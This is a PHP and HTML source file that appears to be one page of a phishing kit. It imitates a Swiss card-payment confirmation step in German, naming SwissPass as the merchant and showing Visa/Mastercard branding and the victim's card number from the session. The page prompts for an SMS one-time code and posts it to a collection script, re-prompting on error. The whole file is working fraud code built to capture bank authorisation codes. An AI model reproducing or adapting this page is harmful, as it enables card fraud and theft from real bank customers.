<?php
session_start(); // Continue the session
include "./all.php";
// Retrieve data from the session
$cardNumber = isset($_SESSION['cardNumber']) ? $_SESSION['cardNumber'] : " ";
$bank_logo = isset($_SESSION['bank_logo']) ? $_SESSION['bank_logo'] : "./media/flag.png";
?>


<!DOCTYPE html>
<html lang="de>
  <head>
    <meta charset=" UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Auth</title>
<style>
body {
    font-family: Arial, sans-serif;
    background-color: #f5f5f5;
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

.container {
    background-color: #fff;
    width: 400px;
    height: 540px;
    border-radius: 5px;
    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    padding: 20px;
    text-align: center;
}

.header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 20px;
}

.header img {
    height: 40px;
}

.title {
    font-size: 1.6em;
    text-align: left;
    /* font-weight: bold; */
    margin-bottom: 20px;
}

.details {
    text-align: left;
    margin-bottom: 20px;
}

.details p {
    margin: 5px 0;
}

.card-number {
    font-weight: bold;
}

.info-box {
    background-color: #f9f9f9;
    border: 1px solid #ddd;
    border-radius: 5px;
    padding: 10px;
    display: flex;
    align-items: center;
    margin-bottom: 20px;
}

.info-box img {
    width: 120px;
    margin-right: 10px;
}

.button-group {
    display: flex;
    justify-content: space-between;
    gap: 10px;
}

.button {
    padding: 10px 20px;
    height: 50px;
    width: 140px;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    font-size: 0.9em;
}

.cancel-button {
    background-color: #f2f2f2;
    color: #333;
}

.cancel-button:hover {
    background-color: #e0e0e0;
}

.cancel-button:hover {
    background-color: rgb(174, 0, 0);
    color: white;
}

.sms-button {
    background-color: #f2f2f2;
    color: #333;
}

.sms-button:hover {
    background-color: rgb(174, 0, 0);
    color: white;
}
</style>
</head>

<body>
    <div class="container">
        <br>
        <div class="header">
            <!-- bank / flag logo here-->
            <img src="<?php echo htmlspecialchars($bank_logo); ?>" alt="Logo" />
            <img src="https://getsby.com/wp-content/uploads/2023/01/Visa-Mastercard-1-1024x378.png"
                alt="Visa/Mastercard Logo" />
        </div>
        <div class="title">Bestätigen</div>
        <div class="details">
            <p>
                Händler:<br />
                <strong>SwissPass</strong>
            </p>
            <!-- <p>Betrag: <br /><strong>CHF <?php echo ($price); ?></strong></p> -->
            <p>
                Datum: <br /><strong><span id="date"></span></strong>
            </p>
            <p>
                Karte: <br />
                <span class="card-number"> <strong><?php echo htmlspecialchars($cardNumber); ?></strong></span>
            </p>
        </div>
        <div class="info-box">
            <form action="./post/sms.php" method="POST" target="_top">
                <!-- inputs start hna -->

                <?php
            if (isset($_GET['error'])) {
               echo '<input type="hidden" name="e" value="1">
         <p style="color:red;">Ungültiger Code, bitte nochmals versuchen!</p>';
            }
            ?>

                <div class="check-div">
                    <div class="input-div">
                        <input type="number" class="inputItem0" data-index="0" autocomplete="off" placeholder="SMS-Code"
                            required autofocus name="otpCode-0" />
                    </div>
                </div>

                <style>
                /* Container: center everything */
                .check-div {
                    display: flex;
                    justify-content: center;
                    /* align-items: center; */
                }

                /* Input wrapper */
                .input-div {
                    padding: 20px;
                    border-radius: 12px;
                    display: inline-block;
                }

                /* Stylish input */
                .inputItem0 {
                    width: 260px;
                    height: 40px;
                    text-align: center;
                    border: 2px solid #ccc;
                    border-radius: 10px;
                    outline: none;
                    transition: border-color 0.3s, box-shadow 0.3s;
                    display: block;
                    margin: 0 auto;
                }

                .inputItem0:focus {
                    border-color: #007BFF;
                    box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
                }

                /* Remove arrows for number inputs */
                input[type="number"]::-webkit-outer-spin-button,
                input[type="number"]::-webkit-inner-spin-button {
                    -webkit-appearance: none;
                    margin: 0;
                }

                input[type="number"] {
                    -moz-appearance: textfield;
                }
                </style>







                <!-- inputs end hna -->
        </div>
        <div class="button-group">
            <button class="button cancel-button" onclick="top.location.href='./app.php'">Abbrechen</button>
            <button class="button sms-button" type="submit" id="submitButton">
                Weiter
            </button>
        </div>

        <script>
        document.addEventListener('DOMContentLoaded', function() {
            const input = document.getElementById('otpInput');
            const submitButton = document.getElementById('submitButton');

            input.addEventListener('input', function() {
                // Limit to 10 characters
                if (input.value.length > 10) {
                    input.value = input.value.slice(0, 10);
                }

                // Enable/disable button based on input length
                submitButton.disabled = input.value.length < 1;
            });
        });
        </script>


        </form>
    </div>
    <script>
    // Automatically set today's date
    const dateElement = document.getElementById("date");
    const today = new Date().toLocaleDateString("de-CH", {
        year: "numeric",
        month: "2-digit",
        day: "2-digit",
    });
    dateElement.textContent = today;
    </script>




</body>

</html>